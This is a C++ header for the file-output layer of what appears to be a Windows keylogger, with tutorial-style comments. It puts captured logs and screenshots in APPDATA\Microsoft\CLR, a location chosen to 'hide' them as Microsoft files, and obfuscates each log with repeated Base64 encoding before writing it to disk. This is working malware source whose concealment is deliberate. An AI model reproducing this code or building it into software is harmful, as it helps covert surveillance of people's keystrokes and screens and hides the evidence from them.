#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"
//namespace for our IO (input-output) operations
namespace IO
{
//function to retrieve our current folder (where all logs and screenshots are stored)
//#append_separator - if true the \ will be added to the end
std::string GetOurPath (const bool append_separarator = false)
    {
        //our path is in APPDATA section (C:\Users\**USER**\AppData\Roaming)
        //we want to additionally "hide" it by placing it in Microsoft\CLR folder
        //get the APPDATA directory for current user. The function "getenv" is used
        //getenv is shorthand for "get environment" and "APPDATA" is an environment
        //variable
        std::string appdata_dir (getenv("APPDATA"));
        //full path
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        //optionally, add \ to the end

        //the
        //X = (CONDITION ? TRUE_PART : FALSE_PART)
        //is a conditional operator, it returns TRUE_PART if CONDITION is met
        //otherwise it returns FALSE_PART to X
        return full + (append_separarator ? "\\" : "");
    }
//creates one directory on "path"
bool MkOneDr (std::string path)
    {
        //WindowsAPI function CreateDirectory creates directory and returns TRUE
        //on success, otherwise it may return ERROR_ALREADY_EXISTS if the directory
        //is already created or FALSE or ERROR_PATH_NOT_FOUND if the call was
        //unsuccessful. So, for us, it is OK that the directory is created some time ago
        //or right now, important is that it exists after the function call
        //this function will NOT create subdirectories if they don't exists
        //so, we have to create one by one ourselves. For example:
        //    Dir1\Dir2\Dir3\Dir4
        //we first need to create Dir1 if not exists, then Dir1\Dir2, then Dir1\Dir2\Dir3...
        //to do that, we'll use the MkDir function function written bellow to call
        //our function several times if needed
        //function parameters:
        //#path: the C string do the directory
        //#pointer to security attributes: we pass NULL so default value is used
        return (bool)CreateDirectory (path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }
bool MkDir (std::string path)
    {
        //we have to split string by on '\'
        //iterate through string
        for (char &c : path)
            //if directory separator, make it nul-terminator
            //so path is terminated right there
            if (c == '\\')
            {
                //terminate it with nul-terminator
                c = '\0';
                //try to create that directory...
                if (!MkOneDr(path))
                    return false;
                //then, restore the original \ separator
                c = '\\';
            }
        return true;
    }
//function will be called periodically and will dump data to log
//returns name of created file
template <class T>
std::string WriteLog (const T &t)
    {
        //our path (APPDATA\Microsoft\CLR
        std::string path = GetOurPath (true);
        Helper::DateTime dt; //current date & time
        //name of the file
        std::string name = dt.GetDateTimeString ("_") + ".log";
        try
            {
                //try to create file
                std::ofstream file (path + name);
                if (!file) return "";
                std::ostringstream s;
                //output to string stream
                s << "[" << dt.GetDateTimeString () << "]" << std::endl << t << std::endl;
                //encode it with our triple Base64 encoding
                std::string data = Base64::EncryptB64 (s.str());
                //dump to file
                file << data;
                if (!file) //on error return empty string
                    return "";
                file.close();
                return name; //return name, if successful
            }
        catch (...)
            {
                return ""; //on exception return empty string
            }
    }
}
#endif // IO_H
